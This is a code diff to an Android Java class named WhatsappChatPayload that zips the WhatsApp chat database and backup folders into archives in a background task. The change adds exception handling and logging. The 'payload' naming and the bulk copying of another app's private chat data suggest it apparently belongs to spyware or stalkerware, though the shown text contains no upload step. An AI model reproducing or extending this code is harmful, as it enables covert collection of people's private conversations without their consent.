@@ -3,6 +3,7 @@ package com.aigs.serviceone.payload;
 import android.app.Activity;
 import android.content.Context;
 import android.os.AsyncTask;
+import android.util.Log;
 
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
 import com.aigs.serviceone.helpers.ZipListener;
@@ -28,27 +29,31 @@ public class WhatsappChatPayload extends AsyncTask<String, Integer, String> {
 
     @Override
     protected String doInBackground(String... strings) {
-        final Context activity = contextWeakReference.get();
+        try {
 
-        File file = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/");
-        File settings = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups/");
+            final Context activity = contextWeakReference.get();
 
-        ZipUtils.getInstance().setZipListener(new ZipListener() {
-            @Override
-            public void onZipDone() {
-                updateProgress();
-            }
-        }).zipDirectory(file,"/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");
+            File file = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/");
+            File settings = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups/");
 
-
-        ZipUtils.getInstance().setZipListener(new ZipListener() {
-            @Override
-            public void onZipDone() {
-                updateProgress();
-            }
-        }).zipDirectory(settings,"/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");
+            ZipUtils.getInstance().setZipListener(new ZipListener() {
+                @Override
+                public void onZipDone() {
+                    updateProgress();
+                }
+            }).zipDirectory(file, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");
 
 
+            ZipUtils.getInstance().setZipListener(new ZipListener() {
+                @Override
+                public void onZipDone() {
+                    updateProgress();
+                }
+            }).zipDirectory(settings, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");
+
+        }catch (Exception e){
+            Log.e("EXCEPTION_WC : ",e.getMessage());
+        }
 
         return null;
     }
